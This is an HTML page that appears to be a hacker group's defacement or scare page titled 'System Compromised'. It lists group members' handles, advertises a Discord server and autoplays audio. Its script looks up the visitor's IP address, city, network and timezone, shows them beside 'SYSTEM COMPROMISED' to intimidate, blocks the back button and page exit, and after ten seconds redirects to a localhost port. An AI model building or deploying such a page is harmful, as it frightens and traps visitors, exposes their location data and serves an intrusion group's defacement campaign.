<!DOCTYPE html>
<html>
<head>
    <title>System Compromised</title>
    <style>
        body {
            background-color: #000000;
            color: white;
            font-family: 'Courier New', monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            cursor: default;
            overflow: hidden;
        }

        .container {
            text-align: center;
            position: relative;
            z-index: 10;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 40px;
            max-width: 400px;
            margin: 0 auto;
        }

        .image-container img {
            max-width: 350px;
            height: auto;
            filter: brightness(0.9) contrast(1.2);
        }

        .team-members {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .member {
            color: #ff0000;
            font-size: 18px;
            padding: 8px 0;
            text-shadow: 0 0 3px #ff0000;
            opacity: 0;
            animation: fadeIn 0.5s forwards;
            animation-delay: calc(var(--order) * 0.2s);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .member.gold {
            color: #FFD700;
            text-shadow: 0 0 5px #FFD700;
            font-size: 20px;
            font-weight: bold;
        }

        .discord-button {
            background: transparent;
            color: #ff0000;
            padding: 12px 25px;
            border: none;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            font-family: 'Courier New', monospace;
            transition: all 0.3s ease;
            text-shadow: 0 0 5px #ff0000;
        }

        .discord-button:hover {
            color: #ffffff;
            text-shadow: 0 0 8px #ff0000;
        }

        .ip-info {
            color: #ff0000;
            font-size: 16px;
            text-shadow: 0 0 3px #ff0000;
        }

        .ip-info div {
            margin: 8px 0;
        }

        .ip-info div:last-child {
            margin-top: 15px;
            font-size: 18px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        .audio-player {
            display: none;
        }

        /* إضافة نمط لمربع Discord */
        .discord-box {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            padding: 15px;
            margin-top: 20px;
            text-align: center;
        }

        .discord-info {
            color: #ff0000;
            font-size: 16px;
            margin-bottom: 10px;
        }

        .discord-link {
            color: #FFD700;
            font-size: 18px;
            text-decoration: none;
            display: block;
            margin-top: 5px;
            text-shadow: 0 0 5px #FFD700;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ip-info" id="ip-info">
            <div>SCANNING SYSTEM...</div>
        </div>

        <div class="image-container">
            <img src="https://c.top4top.io/p_3365imiag1.jpg" alt="Hacked">
        </div>

        <audio id="backgroundAudio" autoplay loop>
            <source src="https://j.top4top.io/m_33656y9oi1.mp3" type="audio/mp3">
        </audio>

        <div class="team-members">
            <div class="member gold" style="--order: 1">0xFor</div>
            <div class="member" style="--order: 2">❤️❤️ Saqr Tathlith ❤️</div>
            <div class="member" style="--order: 3">distannt</div>
            <div class="member" style="--order: 4">ozz</div>
            <div class="member" style="--order: 5">p_yz</div>
            <div class="member" style="--order: 6">undetectedlol</div>
        </div>

        <!-- استبدال زر Discord بمربع -->
        <div class="discord-box">
            <div class="discord-info">JOIN OUR DISCORD SERVER</div>
            <div class="discord-link" id="discordLink">discord.gg/FVM</div>
        </div>
    </div>

    <script>
        window.onload = function() {
            const audio = document.getElementById('backgroundAudio');
            const discordLink = document.getElementById('discordLink');
            
            audio.play().catch(function(error) {
                console.log("Audio autoplay failed:", error);
            });

            document.addEventListener('click', function() {
                audio.play();
            }, { once: true });

            // تعديل فتح Discord
            discordLink.addEventListener('click', function(e) {
                e.preventDefault();
                window.open('https://discord.gg/FVM', '_blank', 'width=1200,height=800');
            });

            // تعديل التوجيه بعد 10 ثواني
            setTimeout(function() {
                let newWindow = window.open('http://localhost:13172/', '_blank', 'width=1200,height=800');
                if (newWindow) {
                    window.close(); // إغلاق النافذة الحالية إذا تم فتح النافذة الجديدة بنجاح
                } else {
                    window.location.replace('http://localhost:13172/');
                }
            }, 10000);

            window.onbeforeunload = function() {
                return '';
            };

            history.pushState(null, null, location.href);
            window.onpopstate = function () {
                history.go(1);
            };
        }

        async function fetchIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                const ipInfo = document.getElementById('ip-info');
                ipInfo.innerHTML = `
                    <div><span class="label">IP:</span> <span class="value">${data.ip}</span></div>
                    <div><span class="label">LOCATION:</span> <span class="value">${data.country_name}</span></div>
                    <div><span class="label">CITY:</span> <span class="value">${data.city}</span></div>
                    <div><span class="label">NETWORK:</span> <span class="value">${data.org}</span></div>
                    <div><span class="label">TIMEZONE:</span> <span class="value">${data.timezone}</span></div>
                    <div> SYSTEM COMPROMISED </div>
                `;
            } catch (error) {
                const ipInfo = document.getElementById('ip-info');
                ipInfo.innerHTML = '<div>CONNECTION FAILED</div>';
            }
        }

        window.addEventListener('load', fetchIPInfo);
    </script>
</body>
</html>
